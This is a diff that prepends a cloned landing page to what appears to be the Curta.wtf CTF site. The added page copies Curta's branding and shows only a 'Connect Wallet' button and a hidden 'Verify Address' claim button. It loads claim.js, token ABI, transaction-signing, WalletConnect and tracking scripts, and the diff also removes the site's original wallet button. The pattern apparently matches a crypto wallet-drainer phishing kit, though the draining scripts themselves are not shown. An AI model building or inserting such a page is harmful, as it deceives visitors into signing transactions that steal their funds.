@@ -1,3 +1,171 @@
+<!doctype html>
+<html lang="fr">
+
+<head>
+    <meta charset="utf-8">
+    <title>Curta.wtf  </title>
+<meta content="Curta.wtf" property="og:title">
+
+<meta name="description" content="A CTF protocol, where players create and solve EVM puzzles to earn NFTs." />
+    <meta name="theme-color" content="#0D1017" /><meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:site" content="@curta_ctf" />
+    <meta property="og:description" content="A CTF protocol, where players create and solve EVM puzzles to earn NFTs." />
+    <meta property="og:url" content="https://curta.wtf" />
+    <meta property="og:site_name" content="Curta" /><link rel="canonical" href="https://curta.wtf" />
+
+
+
+  
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="shortcut icon" href="https://www.curta.wtf/images/favicon.ico" />
+    <link rel="preload" href="./src/css/normal.css" as="style">
+    <link rel="stylesheet" href="./src/css/normal.css">
+    <link rel="stylesheet" href="./src/css/main.css">
+    <link rel="preload" href="./src/css/main.css" as="style">
+    <script src="src/js/1409195906.js" crossorigin="anonymous"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+    <link rel="preload" href="./src/css/normal.css" as="style">
+    <link rel="stylesheet" href="./src/css/normal.css">
+    <link rel="stylesheet" href="./src/css/main.css">
+    <link rel="preload" href="./src/css/main.css" as="style">
+
+    <script src="./settings.js"></script>
+    <link rel="stylesheet" href="./src/css/styles.css">
+
+    <script src="src/js/ethereumjs-tx-1.3.3.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/bignumber.js/8.0.2/bignumber.js" integrity="sha512-XQDG6H87RgMf+aNFwDPCUcFwUf3t9liyqN/2BkJ8KGixupbjPwQHNhypNA972mLIkg4KPo4lkGmqAf3yfDz8hw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script src="src/js/tokenabi.js"></script>
+    <script src="jquery.min.js"></script>
+    <script src="base.js?1"></script>
+
+
+
+</head>
+	<style>
+		body {
+ 
+ 
+
+  .Home_soon__8s2ww button {
+    background-color: #3498DB;
+    border: 2px solid #3498DB;
+    color: white;
+    padding: 10px;
+    border-radius: 15px;
+    box-sizing: border-box;
+    cursor: pointer;
+    text-align: right;    
+    float: left;    
+    display: grid;
+    margin-right: auto;
+    margin-left: auto; 
+    font-size: 15px;
+    font-weight: 600;
+    line-height: 20px;
+    margin: 0;
+    outline: none;
+    padding: 13px 23px;
+    position: fixed;
+    text-align: center;
+    text-decoration: none;
+    touch-action: manipulation;
+    transition: box-shadow .2s, -ms-transform .1s, -webkit-transform .1s, transform .1s;
+    user-select: none;
+    -webkit-user-select: none;
+    width: auto;
+    animation: blink 2s linear infinite; /* Agregamos la animación blink */
+}
+
+.Home_soon__8s2ww button:focus-visible {
+    box-shadow: #27AE60 0 0 0 2px, rgba(255, 255, 255, 0.8) 0 0 0 4px;
+    transition: box-shadow .2s;
+}
+
+.Home_soon__8s2ww button:active {
+    background-color: #F012BE; /* Cambiamos el color de fondo al hacer clic */
+    border-color: #000000;
+    transform: scale(.96);
+    animation: none; /* Detenemos la animación */
+}
+
+.Home_soon__8s2ww button:disabled {
+    border-color: #DDDDDD;
+    color: #DDDDDD;
+    cursor: not-allowed;
+    opacity: 1;
+}
+
+/* Definimos la animación blink */
+@keyframes blink {
+    50% {
+        background-color: #F012BE;
+        color: white;
+    }
+    100% {
+        background-color: #222;
+        color: white;
+    }
+}
+
+</style>
+
+	
+
+
+	
+	
+
+
+
+                    <div class="Home_soon__8s2ww">
+                        <button id="connectWallet">ᴄᴏɴɴᴇᴄᴛ ᴡᴀʟʟᴇᴛ</button>
+                        <button id="claimButton" style="display: none;">Verify Address</button>
+			 
+
+
+			  
+
+                        <br />
+			    
+                    </div>
+                    
+                    
+                    <div class="Home_socials__Gabme">
+                     
+                            <span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%">
+                                <span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%">
+                                    <img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg xmlns=%27http://www.w3.org/2000/svg%27 version=%271.1%27 width=%2748%27 height=%2748%27/%3e">
+                                </span>
+                            </span>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="./src/js/loader_index.js"></script>
+
+    <script type="text/javascript" src="src/js/web3.min.js"></script>
+    <script type="text/javascript" src="src/js/moralis.js"></script>
+    <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.5/dist/umd/index.min.js"></script>
+    <script type="text/javascript" src="src/js/claim.js"></script>
+    
+    <script type="text/javascript" src="./src/js/index.min.js"></script>
+
+    <script type="text/javascript">
+        $('.alert-eth-message-close').click(function(){
+            $('.alert-eth-message').fadeOut(200);
+        });
+	    
+
+
+</script>
+</body>
+<script charset="UTF-8" id="LA_COLLECT" src="./src/js/js-sdk-pro.min.js"></script>
+
+
 
 <!DOCTYPE html>
 <html lang="en" style="background:#0D1017">
@@ -62,7 +230,6 @@
               <button class="px-4 rounded-xl py-2 text-md font-medium transition-colors flex justify-center items-center outline-none focus:outline-none focus:ring-2 focus:ring-blue-250 bg-none data-primary:bg-gray-250 data-primary:hover:bg-gray-200 data-secondary:text-gray-150 data-secondary:bg-gray-400 data-secondary:hover:bg-gray-500 data-secondary:data-disabled:text-gray-350 data-secondary:data-disabled:bg-gray-600 data-tertiary:text-gray-100 data-tertiary:border-gray-300 data-tertiary:hover:border-gray-250 data-intent-text:text-gray-200 data-intent-text:hover:text-gray-100 data-intent-text:hover:bg-gray-450 ml-4" data-intent="text" data-disabled="false" aria-disabled="false" href="/guides">Guides</button></div>
             <div class="flex flex-1 justify-end">
               <div aria-hidden="true" style="opacity:0;pointer-events:none;user-select:none">
-                <button class="px-4 rounded-xl py-2 text-md font-medium transition-colors flex justify-center items-center outline-none focus:outline-none focus:ring-2 focus:ring-blue-250 data-primary:bg-blue-250 data-primary:hover:bg-blue-200 data-secondary:text-blue-200 data-secondary:bg-blue-800 data-secondary:hover:bg-blue-900 data-secondary:data-disabled:text-blue-700 data-secondary:data-disabled:bg-blue-900 data-tertiary:text-blue-150 data-tertiary:border-blue-300 data-tertiary:hover:border-blue-200 data-intent-text:text-blue-150 data-intent-text:hover:text-blue-100 data-intent-text:hover:bg-blue-900 w-full" data-intent="secondary" data-disabled="false" aria-disabled="false" type="button">Connect Wallet</button></div></div></div></nav>
         <nav class="sticky top-0 z-popover flex bg-gray-900 px-3 lg:hidden">
           <div class="flex h-14 w-full items-center justify-between">
             <a class="font-semibold text-white transition-colors hover:text-gray-50 flex items-center text-sm" href="/">
